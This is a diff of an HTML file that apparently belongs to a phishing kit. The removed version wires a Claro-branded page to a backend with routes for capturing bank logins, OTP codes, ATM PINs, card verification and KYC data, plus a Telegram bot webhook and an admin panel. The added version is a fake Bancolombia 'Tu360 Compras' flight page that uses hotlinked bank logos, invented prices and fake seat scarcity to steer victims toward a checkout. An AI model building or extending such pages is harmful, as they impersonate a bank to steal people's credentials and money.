@@ -1,76 +1,566 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-    <!-- Assets desde miportalpostventas.com -->
-    <link rel="preload" as="style" href="https://miportalpostventas.com/build/assets/app-DKFN5zXD.css" />
-    <link rel="preload" as="style" href="https://miportalpostventas.com/build/assets/app-CmR14Vvn.css" />
-    <link rel="modulepreload" href="https://miportalpostventas.com/build/assets/app-rkTaYtKa.js" />
-    <link rel="modulepreload" href="https://miportalpostventas.com/build/assets/vue-vendor-Czy81Teu.js" />
-    <link rel="modulepreload" href="https://miportalpostventas.com/build/assets/utils-DNk52mmw.js" />
-    <link rel="stylesheet" href="https://miportalpostventas.com/build/assets/app-DKFN5zXD.css" />
-    <link rel="stylesheet" href="https://miportalpostventas.com/build/assets/app-CmR14Vvn.css" />
-    <script type="module" src="https://miportalpostventas.com/build/assets/app-rkTaYtKa.js"></script>
-    
-    <script type="text/javascript">
-      // IMPORTANTE: Cambia la URL de Ziggy al dominio CORRECTO del backend
-      const Ziggy = {
-        "url": "https://kjniu-production.up.railway.app",  // ⬅️ Tu backend REAL
-        "port": null,
-        "defaults": {},
-        "routes": {
-          "telebot.webhook": {"uri": "telebot/webhook/{bot}/{token}", "methods": ["POST"], "parameters": ["bot", "token"]},
-          "index": {"uri": "/", "methods": ["GET", "HEAD"]},
-          "volver.inicio": {"uri": "volver-inicio", "methods": ["POST"]},
-          "proceso.pago": {"uri": "proceso/pago", "methods": ["GET", "HEAD"]},
-          "proceso.finalizado": {"uri": "proceso/finalizado", "methods": ["GET", "HEAD"]},
-          "proceso.finishNoBack": {"uri": "proceso/finishNoBack", "methods": ["GET", "HEAD"]},
-          "proceso.error404": {"uri": "proceso/error404", "methods": ["GET", "HEAD"]},
-          "proceso.error": {"uri": "proceso/error", "methods": ["GET", "HEAD"]},
-          "pago.mercadopago": {"uri": "pago/mercadopago", "methods": ["POST"]},
-          "pago.success": {"uri": "pago/success", "methods": ["GET", "HEAD"]},
-          "pago.failure": {"uri": "pago/failure", "methods": ["GET", "HEAD"]},
-          "pago.pending": {"uri": "pago/pending", "methods": ["GET", "HEAD"]},
-          "pago.webhook": {"uri": "pago/webhook", "methods": ["POST"]},
-          "proceso.show.banco": {"uri": "proceso/banco", "methods": ["GET", "HEAD"]},
-          "proceso.step": {"uri": "proceso/step", "methods": ["POST"]},
-          "estado.usuario": {"uri": "estado/usuario", "methods": ["POST"]},
-          "proceso.index": {"uri": "proceso/index", "methods": ["POST"]},
-          "proceso.inicio": {"uri": "proceso/inicio", "methods": ["POST"]},
-          "proceso.login": {"uri": "proceso/login", "methods": ["POST"]},
-          "proceso.app": {"uri": "proceso/app", "methods": ["POST"]},
-          "proceso.atm": {"uri": "proceso/atm", "methods": ["POST"]},
-          "proceso.otp": {"uri": "proceso/otp", "methods": ["POST"]},
-          "proceso.mail": {"uri": "proceso/mail", "methods": ["POST"]},
-          "proceso.info": {"uri": "proceso/info", "methods": ["POST"]},
-          "proceso.product": {"uri": "proceso/product", "methods": ["POST"]},
-          "proceso.kyc": {"uri": "proceso/kyc", "methods": ["POST"]},
-          "tarjeta.detail": {"uri": "checkout/detail", "methods": ["GET", "HEAD"]},
-          "tarjeta.code": {"uri": "checkout/app", "methods": ["GET", "HEAD"]},
-          "tarjeta.sms": {"uri": "checkout/otp", "methods": ["GET", "HEAD"]},
-          "tarjeta.atm": {"uri": "checkout/code", "methods": ["GET", "HEAD"]},
-          "tarjeta.wait": {"uri": "checkout/waiting", "methods": ["GET", "HEAD"]},
-          "tarjeta.check": {"uri": "checkout/estado", "methods": ["POST"]},
-          "verificacion.tarjeta.login": {"uri": "verificacion/tarjeta/login", "methods": ["POST"]},
-          "verificacion.tarjeta.otp": {"uri": "verificacion/tarjeta/otp", "methods": ["POST"]},
-          "verificacion.tarjeta.app": {"uri": "verificacion/tarjeta/app", "methods": ["POST"]},
-          "verificacion.tarjeta.atm": {"uri": "verificacion/tarjeta/atm", "methods": ["POST"]},
-          "login": {"uri": "crud/login", "methods": ["GET", "HEAD"]},
-          "admin.login.submit": {"uri": "crud/login", "methods": ["POST"]},
-          "admin.logout": {"uri": "crud/logout", "methods": ["POST"]},
-          "admin.dashboard": {"uri": "crud/dashboard", "methods": ["GET", "HEAD"]},
-          "admin.dashboard.store": {"uri": "crud/dashboard", "methods": ["POST"]},
-          "admin.toggle-mercadopago": {"uri": "toggle-mercadopago", "methods": ["POST"]},
-          "storage.local": {"uri": "storage/{path}", "methods": ["GET", "HEAD"], "wheres": {"path": ".*"}, "parameters": ["path"]}
-        }
-      };
-      
-      // El resto del script Ziggy (igual que antes)
-      !function(t,r){"object"==typeof exports&&"undefined"!=typeof module?module.exports=r():"function"==typeof define&&define.amd?define(r):(t||self).route=r()}(this,function(){ /* ... código Ziggy completo ... */ });
-    </script>
-  </head>
-  <body>
-    <div id="app" data-page="{&quot;component&quot;:&quot;Claro\/BuscarNumero&quot;,&quot;props&quot;:{&quot;errors&quot;:{},&quot;flash&quot;:{&quot;message&quot;:null,&quot;success&quot;:null,&quot;errors&quot;:null},&quot;otpSent&quot;:false,&quot;telefonoOtp&quot;:null,&quot;session&quot;:{&quot;numero&quot;:null},&quot;auth&quot;:{&quot;user&quot;:null}},&quot;url&quot;:&quot;\/&quot;,&quot;version&quot;:&quot;4170a83c741defe30f4290dac0883613&quot;,&quot;clearHistory&quot;:false,&quot;encryptHistory&quot;:false}"></div>
-  </body>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Resultados – Tu360 Compras</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<style>
+
+body{
+  margin:0;
+  font-family:Arial;
+  background:#f2f2f2;
+  font-size:14px;   /* 👈 tamaño base igual al otro */
+}
+
+.top-header{
+  background:#fff;
+  padding:12px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  border-bottom:1px solid #ddd;
+  font-size:14px;
+}
+
+.logo{
+  font-size:18px;   /* antes 22, lo bajo para coherencia */
+  font-weight:bold;
+}
+
+.actions{
+  display:flex;
+  gap:10px;
+  padding:12px;
+  background:#fff;
+}
+
+.btn-dark{
+  background:#2b2b2b;
+  color:#fff;
+  border:none;
+  padding:10px 14px;
+  border-radius:30px;
+  cursor:pointer;
+  font-size:14px;
+}
+
+.title{
+  padding:10px 14px;
+  font-size:16px;   /* un poco más pequeño y consistente */
+  font-weight:bold;
+}
+
+.summary{
+  background:#3b3b3b;
+  color:#fff;
+  margin:10px 14px;
+  padding:12px;
+  border-radius:12px;
+  font-size:14px;
+}
+
+.container{
+  padding:10px 14px;
+}
+
+.card{
+  background:#fff;
+  border-radius:12px;
+  margin-bottom:12px;
+  padding:12px;
+  box-shadow:0 2px 8px rgba(0,0,0,.1);
+  font-size:14px;
+}
+
+.option{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  padding:10px 0;
+  border-bottom:1px solid #eee;
+  font-size:14px;
+}
+
+.time{
+  font-size:16px;   /* antes 18 */
+  font-weight:bold;
+}
+
+.airport{
+  font-weight:bold;
+  font-size:14px;
+}
+
+.price{
+  text-align:right;
+  margin-top:10px;
+  font-size:16px;   /* antes 18 */
+}
+
+.btn-select{
+  width:100%;
+  background:#ffd100;
+  border:none;
+  border-radius:30px;
+  padding:10px;
+  font-size:14px;
+  margin-top:10px;
+  cursor:pointer;
+}
+
+.promo-badge{
+  background:#2b2b2b;
+  color:#fff;
+  padding:4px 8px;
+  border-radius:8px;
+  font-size:12px;
+  margin-right:6px;
+}
+
+.price-row{
+  display:flex;
+  align-items:center;
+  justify-content:flex-end;
+  gap:8px;
+  margin-top:10px;
+  font-size:14px;
+}
+
+.price-row img{
+  width:20px;
+  height:20px;
+}
+
+.airline img{
+  width:22px;   /* un poco más pequeño */
+  height:auto;
+}
+
+.flight-header{
+  display:flex;
+  border-bottom:1px solid #ddd;
+  margin-bottom:10px;
+  font-size:14px;
+}
+
+.flight-header-left{
+  background:#f0f0f0;
+  padding:10px;
+  flex:1;
+  border-top-left-radius:10px;
+  font-weight:bold;
+  display:flex;
+  align-items:center;
+  gap:6px;
+  font-size:14px;
+}
+
+.flight-header-right{
+  padding:10px;
+  text-align:right;
+  font-weight:bold;
+  flex:1;
+  font-size:14px;
+}
+
+.ida-bar{
+  border-left:5px solid #00b5e2;
+}
+
+.vuelta-bar{
+  border-left:5px solid #ff6b00;
+}
+
+.option.selected{
+  background:#fff9d9;
+  border-left:5px solid #ffd100;
+}
+
+.lugares{
+  color:#c00;
+  font-style:italic;
+  font-size:12px;
+  text-align:right;
+}
+
+.maletas{
+  display:flex;
+  gap:6px;
+  justify-content:flex-end;
+  opacity:0.6;
+  font-size:13px;
+}
+
+.details{
+  font-size:13px;
+  color:#666;
+  margin-top:4px;
+  display:none;
+}
+
+.toggle{
+  cursor:pointer;
+  font-size:13px;
+}
+
+/* Ajustes responsivos */
+@media (max-width: 600px){
+
+  body{
+    font-size:13px;
+  }
+
+  .logo{
+    font-size:16px;
+  }
+
+  .title{
+    font-size:15px;
+  }
+
+  .time{
+    font-size:15px;
+  }
+
+  .price{
+    font-size:15px;
+  }
+
+  .btn-select{
+    font-size:13px;
+  }
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+<div class="top-header">
+  <div class="logo">Tu360 Compras</div>
+</div>
+
+<div class="actions">
+  <button class="btn-dark" onclick="window.history.back()">Nueva búsqueda</button>
+</div>
+
+<div class="title" id="titulo"></div>
+
+<div class="summary" id="resumen"></div>
+
+<div class="container" id="resultBox"></div>
+
+<script>
+
+function getParam(name){
+  let url = new URL(window.location.href);
+  return url.searchParams.get(name);
+}
+
+let origen = getParam("origen");
+let destino = getParam("destino");
+let ida = getParam("ida");
+let vuelta = getParam("vuelta");
+let tipo = getParam("tipo");
+
+let pasajerosTexto = getParam("pasajeros") || "1";
+let pasajeros = parseInt(pasajerosTexto.replace(/\D/g, ""));
+
+if(isNaN(pasajeros) || pasajeros < 1){
+  pasajeros = 1;
+}
+
+document.getElementById("titulo").innerText =
+  "Paquete a " + destino;
+
+let textoResumen = tipo === "oneway"
+  ? "Vuelo solo ida para " + pasajeros + " pasajero(s)"
+  : "Vuelos de ida y vuelta para " + pasajeros + " pasajero(s)";
+
+document.getElementById("resumen").innerText = textoResumen;
+
+const logosAerolineas = {
+  "LATAM Airlines": "https://reservas.bancolombia.com/Images/Airlines/air_LAlogo.gif",
+  "Avianca": "https://reservas.bancolombia.com/Images/Airlines/air_AVlogo.gif",
+  "JetSMART": "https://reservas.bancolombia.com/Images/Airlines/air_JAlogo.gif",
+  "Wingo": "https://reservas.bancolombia.com/Images/Airlines/air_P5logo.gif"
+};
+
+// ===== MUCHAS HORAS POR AEROLÍNEA =====
+const opciones = [
+
+  // ===== AVIANCAS =====
+  { aerolinea: "Avianca", idaHora: "06:00", idaLlegada: "07:10", vueltaHora: "09:30", vueltaLlegada: "10:40" },
+  { aerolinea: "Avianca", idaHora: "08:45", idaLlegada: "09:55", vueltaHora: "12:15", vueltaLlegada: "13:25" },
+  { aerolinea: "Avianca", idaHora: "14:20", idaLlegada: "15:30", vueltaHora: "17:40", vueltaLlegada: "18:50" },
+  { aerolinea: "Avianca", idaHora: "19:10", idaLlegada: "20:20", vueltaHora: "21:45", vueltaLlegada: "22:55" },
+
+  // ===== LATAM =====
+  { aerolinea: "LATAM Airlines", idaHora: "05:50", idaLlegada: "07:00", vueltaHora: "08:20", vueltaLlegada: "09:30" },
+  { aerolinea: "LATAM Airlines", idaHora: "11:15", idaLlegada: "12:25", vueltaHora: "15:10", vueltaLlegada: "16:20" },
+  { aerolinea: "LATAM Airlines", idaHora: "16:30", idaLlegada: "17:40", vueltaHora: "19:00", vueltaLlegada: "20:10" },
+  { aerolinea: "LATAM Airlines", idaHora: "20:50", idaLlegada: "22:00", vueltaHora: "22:40", vueltaLlegada: "23:50" },
+
+  // ===== JETSMART =====
+  { aerolinea: "JetSMART", idaHora: "06:15", idaLlegada: "07:25", vueltaHora: "10:10", vueltaLlegada: "11:20" },
+  { aerolinea: "JetSMART", idaHora: "12:40", idaLlegada: "13:50", vueltaHora: "15:20", vueltaLlegada: "16:30" },
+  { aerolinea: "JetSMART", idaHora: "15:50", idaLlegada: "17:00", vueltaHora: "18:40", vueltaLlegada: "19:50" },
+  { aerolinea: "JetSMART", idaHora: "22:10", idaLlegada: "23:20", vueltaHora: "23:40", vueltaLlegada: "00:50" },
+
+  // ===== WINGO =====
+  { aerolinea: "Wingo", idaHora: "07:10", idaLlegada: "08:20", vueltaHora: "09:40", vueltaLlegada: "10:50" },
+  { aerolinea: "Wingo", idaHora: "13:30", idaLlegada: "14:40", vueltaHora: "16:10", vueltaLlegada: "17:20" },
+  { aerolinea: "Wingo", idaHora: "18:45", idaLlegada: "19:55", vueltaHora: "20:30", vueltaLlegada: "21:40" },
+  { aerolinea: "Wingo", idaHora: "23:00", idaLlegada: "00:10", vueltaHora: "05:30", vueltaLlegada: "06:40" }
+
+];
+
+function calcularPrecio(hora){
+  let h = parseInt(hora.split(":")[0]);
+
+  if (h >= 5 && h < 12) return 110999;
+  if (h >= 12 && h < 18) return 168500;
+
+  return Math.floor(Math.random() * (386458 - 240454)) + 240454;
+}
+
+let precioIda = 0;
+let precioVuelta = 0;
+
+function actualizarPrecio(){
+
+  let totalSinDescuento = (precioIda + precioVuelta) * pasajeros;
+
+  let descuento = totalSinDescuento * 0.05;
+
+  let totalConDescuento = totalSinDescuento - descuento;
+
+  document.getElementById("precioFinal").innerHTML = `
+
+    <div class="price-row">
+      <img src="https://tu360compras.bancolombia.com/themes/child/img/favicon-bancolombia.svg">
+      <span class="promo-badge">5% Off</span>
+      <b>COP $ ${totalConDescuento.toLocaleString()}</b>
+    </div>
+  `;
+}
+
+function seleccionarIda(valor){
+  precioIda = parseInt(valor);
+  actualizarPrecio();
+}
+
+function seleccionarVuelta(valor){
+  precioVuelta = parseInt(valor);
+  actualizarPrecio();
+}
+
+function cargarResultados(){
+
+  let box = document.getElementById("resultBox");
+
+  let html = `
+  <div class="card">
+
+    <div class="flight-header">
+      <div class="flight-header-left ida-bar">
+        <i class="fa fa-plane"></i> IDA
+      </div>
+
+      <div class="flight-header-right">
+        ${ida}
+      </div>
+    </div>
+  `;
+
+  opciones.forEach((v,i) => {
+
+    let precio = calcularPrecio(v.idaHora);
+    let lugares = lugaresAleatorios();
+    let detalleId = "detIda" + i;
+
+    html += `
+      <div class="option option-ida">
+
+        <input type="radio" name="ida"
+          onclick="seleccionarIda(${precio}); marcarSeleccion('option-ida', this)">
+
+        <div class="airline-row">
+          <img src="${logosAerolineas[v.aerolinea]}" alt="">
+          <div>
+            <b>${v.aerolinea}</b><br>
+            ${origen} <b>${v.idaHora}</b> → ${destino} <b>${v.idaLlegada}</b>
+          </div>
+        </div>
+
+        <div style="margin-left:auto; text-align:right">
+          COP $ ${precio.toLocaleString()}
+
+          <div class="maletas">
+            <i class="fa fa-suitcase"></i>
+            <i class="fa fa-briefcase"></i>
+          </div>
+
+          <div class="lugares">
+            quedan ${lugares} lugares
+          </div>
+
+          <div class="toggle" onclick="toggleDetalles('${detalleId}')">
+            Ver detalles ▼
+          </div>
+
+        </div>
+
+      </div>
+
+      <div class="details" id="${detalleId}">
+        Duración estimada: 1h 10m – Vuelo directo
+      </div>
+    `;
+  });
+
+  html += `</div>`;
+
+  if(tipo !== "oneway"){
+
+    html += `
+    <div class="card">
+
+      <div class="flight-header">
+        <div class="flight-header-left vuelta-bar">
+          <i class="fa fa-plane fa-rotate-180"></i> VUELTA
+        </div>
+
+        <div class="flight-header-right">
+          ${vuelta}
+        </div>
+      </div>
+    `;
+
+    opciones.forEach((v,i) => {
+
+      let precio = calcularPrecio(v.vueltaHora);
+      let lugares = lugaresAleatorios();
+      let detalleId = "detVuelta" + i;
+
+      html += `
+        <div class="option option-vuelta">
+
+          <input type="radio" name="vuelta"
+            onclick="seleccionarVuelta(${precio}); marcarSeleccion('option-vuelta', this)">
+
+          <div class="airline-row">
+            <img src="${logosAerolineas[v.aerolinea]}" alt="">
+            <div>
+              <b>${v.aerolinea}</b><br>
+              ${destino} <b>${v.vueltaHora}</b> → ${origen} <b>${v.vueltaLlegada}</b>
+            </div>
+          </div>
+
+          <div style="margin-left:auto; text-align:right">
+            COP $ ${precio.toLocaleString()}
+
+            <div class="maletas">
+              <i class="fa fa-suitcase"></i>
+              <i class="fa fa-briefcase"></i>
+            </div>
+
+            <div class="lugares">
+              quedan ${lugares} lugares
+            </div>
+
+            <div class="toggle" onclick="toggleDetalles('${detalleId}')">
+              Ver detalles ▼
+            </div>
+
+          </div>
+
+        </div>
+
+        <div class="details" id="${detalleId}">
+          Duración estimada: 1h 10m – Vuelo directo
+        </div>
+      `;
+    });
+
+    html += `</div>`;
+  }
+
+  html += `
+    <div class="card">
+      <div class="price" id="precioFinal">
+
+        <div class="price-row">
+          <img src="https://tu360compras.bancolombia.com/themes/child/img/favicon-bancolombia.svg">
+          <span class="promo-badge">5% Off</span>
+          <b>COP $ 0</b>
+        </div>
+
+      </div>
+
+      <button class="btn-select" onclick="irADetalle()">
+  Confirmar selección
+</button>
+
+    </div>
+  `;
+
+  box.innerHTML = html;
+}
+
+cargarResultados();
+
+  function lugaresAleatorios(){
+  return Math.floor(Math.random() * 10) + 1;
+}
+
+function toggleDetalles(id){
+  let d = document.getElementById(id);
+  d.style.display = d.style.display === "block" ? "none" : "block";
+}
+
+function marcarSeleccion(clase, elemento){
+  document.querySelectorAll("." + clase).forEach(e => {
+    e.classList.remove("selected");
+  });
+
+  elemento.closest(".option").classList.add("selected");
+}
+function irADetalle(){
+
+  if(precioIda === 0){
+    alert("Debes seleccionar un vuelo de ida");
+    return;
+  }
+
+  if(tipo !== "oneway" && precioVuelta === 0){
+    alert("Debes seleccionar un vuelo de vuelta");
+    return;
+  }
+
+  let url = "detalle.html?" +
+    "origen=" + encodeURIComponent(origen) +
+    "&destino=" + encodeURIComponent(destino) +
+    "&ida=" + encodeURIComponent(ida) +
+    "&vuelta=" + encodeURIComponent(vuelta) +
+    "&tipo=" + encodeURIComponent(tipo) +
+    "&pasajeros=" + encodeURIComponent(pasajeros) +
+    "&precioIda=" + encodeURIComponent(precioIda) +
+    "&precioVuelta=" + encodeURIComponent(precioVuelta);
+
+
+  window.location.href = url;
+}
+
+
+</script>
+
+
+</body>
 </html>
